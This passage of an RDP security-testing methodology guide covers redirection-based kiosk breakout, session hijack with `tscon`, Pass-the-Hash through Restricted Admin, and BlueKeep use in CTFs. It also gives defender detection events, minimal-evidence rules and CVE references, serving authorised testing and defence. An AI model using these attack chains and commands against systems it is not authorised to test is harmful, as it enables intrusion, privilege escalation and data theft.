| Channel | Flag to test | Finding when it works |
|---|---|---|
| Clipboard (`CLIPRDR`) | `+clipboard` | Copy data out of / into a session that should be isolated |
| Drive (`RDPDR`, disk) | `/drive:x,/tmp` | File move both directions — the exfil/implant primitive |
| Printer / port / smartcard (`RDPDR`) | `/printer` `/serial` `/smartcard` | Device bridging into a segmented environment |
| RemoteApp (`RAIL`) + drive | published-app + `/drive` | **Kiosk breakout**: a file dialog in a single published app + a redirected drive is a path to a shell |

The server-side controls are the `fDisableClip`, `fDisableCdm` (drives),
`fDisableCcm` (COM ports), `fDisableLPT` (printers), `fDisableCpm`, and
`fDisableClip` GPO/registry values under
`HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services`. The finding is
"redirection policy not enforced on an isolation-critical host" — demonstrate
with a single benign canary (a marker string on the clipboard, one small text
file copied through `/drive` then deleted), never bulk data. On a RemoteApp
kiosk the demonstration is the breakout chain: published app → Open/Save dialog
→ redirected drive → `cmd`/`powershell`. This is the highest-impact redirection
finding and reads as "application allow-listing bypass," not "clipboard works."

### S8 — Detection and the blue/red seam (tunnelling and session takeover)

Phase 5's rdp2tcp and the EvilRDP/SharpRDP/PyRDP tooling turn a held session
into transport; a tester who frames findings for a defender needs to know what
they trip, and a red-teamer needs to know what is loud:

- **Session events.** Interactive RDP logon is **4624 logon type 10**;
  reconnect/disconnect of a session is **4778 / 4779** (with client name and
  address); `tscon`/shadow session-takeover shows as a session reconnect to a
  *different* user than logged it on — the Phase 3 hijack is loud in exactly
  this pairing. New-session + process spawned under `rdpclip.exe` / `tstheme` /
  `mstsc` lineage is the Sysmon tell for interactive takeover.
- **Tunnelling tells.** rdp2tcp/PyRDP register non-standard dynamic virtual
  channel names and push anomalous data volume over an otherwise
  display-dominated 3389 session; long-lived sessions with high upstream bytes,
  or a static virtual channel that is not in the normal `{CLIPRDR, RDPDR,
  RDPSND, RAIL, DRDYNVC}` set, are the network signature. Zeek's RDP analyzer
  and Suricata RDP rules surface the negotiation and channel metadata without
  decrypting the session.
- **Shadowing.** Consent-prompted shadow (Phase 3a) is visible to the user by
  design; no-consent shadow still writes the 4778/4779 trail and the `Shadow`
  policy read. There is no silent session-view — only an unmonitored one.

For the report: when you demonstrate a tunnelling or takeover technique, include
the defender's detection path ("this is observable as 4778 from an unexpected
client address") — it raises the finding's credibility and is often what moves
severity.

### S9 — Evidence standards per class

Match the proof to the finding, capture the minimum, clean up:

| Finding class | Evidence that proves it | Stop at |
|---|---|---|
| Pre-auth disclosure (S1/S2) | `rdp-ntlm-info` / `ssl-cert` output block; for an internet-facing NLA-off host, one `--nla-screenshot` of the logon screen | The screenshot — do not log in |
| Security-layer posture (S0) | `rdp-sec-check` / NetExec `(nla:...)` line showing the selected protocol | The negotiation readout |
| Pass-the-Hash (Phase 2) | One session screenshot: `whoami` + the mode used; redact the hash to first/last 4 | A single command, no data pull |
| Session hijack (Phase 3) | `query user` before → `tscon` → `whoami` after, one screenshot sequence showing the *different* identity | Proving the identity change |
| Redirection (S7) | A single canary: marker clipboard string, or one small file copied through `/drive` then deleted | The canary — no real data |
| MITM-possible (S4) | `PROTOCOL_RDP`-only readout, or a cert-trust gap; a pcap *excerpt* if MITM was authorized | Never store captured real credentials |
| Gateway/RDWeb (S6) | HTTP status map, NTLM-info block, enumeration timing delta — never a completed spray against live accounts | One valid-vs-invalid pair |

Universal rules: one connection per probe, never a session-count flood;
lockout-aware on every RDWeb/RDG/3389 spray; destroy test accounts, redirected
files, and any captured material; and when a finding is "this is *possible*"
(MITM, DoS), prove the *precondition* and stop — do not detonate it on a live
program.

### S10 — CTF notes (how this differs from a bounty)

RDP is a recurring CTF/lab pattern, and the classic boxes map onto the phases
above — with the constraints inverted:

- **The BlueKeep box** (unpatched 2008 R2 / 7, NLA off): Phase 4 + Metasploit
  `cve_2019_0708_bluekeep` is the intended path. In a CTF the crash-prone,
  DoS-risky exploit is fair game and loud scanning is free; in a bounty the same
  module is often out of scope precisely because it can blue-screen the target —
  demonstrate the *condition* (`rdp-vuln-ms12-020` / scanner module, never the
  exploit) and report.
- **The tscon privesc** (SYSTEM → a disconnected Administrator/Domain Admin
  session): Phase 3 `query user; tscon <id> /dest:console` is a staple
  local-privilege-escalation flag path. Identical technique in both worlds; the
  CTF difference is that the convenient disconnected admin session is *placed*
  for you, whereas in a real engagement finding one is the work.
- **PtH via Restricted Admin** (Phase 2): loot an NT hash from one box, `/pth`
  into the next. CTF ranges enable `DisableRestrictedAdmin=0` so it just works;
  real environments increasingly do not (S3), which is the whole finding.
- **Creds in a session / in a `.rdp` file / in the clipboard** (S7): CTFs love
  secrets left in a disconnected session or a saved `.rdp`. The same hunt is
  legitimate recon in an engagement, but the exfil discipline (canary, not bulk)
  is the difference.

The through-line: a CTF rewards detonating the technique; a bounty rewards
*proving the precondition and the impact while leaving the target intact*.
Every destructive step above (BlueKeep RCE, RDG DoS, a real spray) is a flag in
one context and a rules-of-engagement violation in the other.

### S11 — Current-year references (verified 2026-11-19)

- MSRC, CVE-2026-56190 (Windows RDP RCE) — https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-56190
- MSRC, CVE-2026-70033 (RD Gateway DoS) — https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-70033
- Red Hat, CVE-2026-55827 (FreeRDP RemoteFX heap OOB write, fixed 3.27.1) — https://access.redhat.com/security/cve/cve-2026-55827
- Red Hat, CVE-2026-69159 (FreeRDP planar OOB read, fixed 3.29.0) — https://access.redhat.com/security/cve/cve-2026-69159
- SentinelOne vuln DB, CVE-2026-67306 / -45700 / -55192 / -91958 (FreeRDP client cluster) — https://www.sentinelone.com/vulnerability-database/cve-2026-67306/
- OSV, OESA-2026-1521 (FreeRDP client CVE batch, fixes 3.21.0–3.23.0) — https://osv.dev/vulnerability/OESA-2026-1521
- Microsoft, MS-RDPBCGR §2.2.1 (RDP Negotiation Request/Response, security-protocol constants) — https://learn.microsoft.com/openspecs/windows_protocols/ms-rdpbcgr/
- Microsoft, MS-NLMP (NTLM AV_PAIR / TargetInfo fields read by rdp-ntlm-info) — https://learn.microsoft.com/openspecs/windows_protocols/ms-nlmp/
- PyRDP (GoSecure) — RDP MITM / interception / honeypot — https://github.com/GoSecure/pyrdp
- Seth (SySS) — RDP MITM + NLA downgrade — https://github.com/SySS-Research/Seth
- Nmap NSE: rdp-ntlm-info, rdp-sec-check, rdp-enum-encryption, ssl-cert, http-ntlm-info — https://nmap.org/nsedoc/

*Supplement provenance: appended 2026-11-19 by model claude-opus-4-8. Current-year focus per brief; CVE-2026-56190 (CVSS 9.8, CWE-908, pre-auth, "Exploitation Less Likely," NLA-mitigation unproven, wormability unconfirmed) and CVE-2026-70033 (RD Gateway unauth DoS) confirmed via MSRC; FreeRDP 2026 client cluster (CVE-2026-55827/-45700/-67306/-69159/-55192/-91958/-109249/-22859) via Red Hat and SentinelOne advisories, severities to be gated on FreeRDP GitHub advisories before quoting; negotiation and NTLM-leak mechanics from MS-RDPBCGR/MS-NLMP. Older wormables (BlueKeep, MS12-020, BlueGate RDG) held to one-line historical context per the content-priority override. Preserves all prior content; adds pre-auth negotiation craft, the gateway/RDWeb perimeter, redirection data-exposure, MITM and rogue-server client-attack surface, blue/red detection framing, per-class evidence standards, and CTF contrasts.*
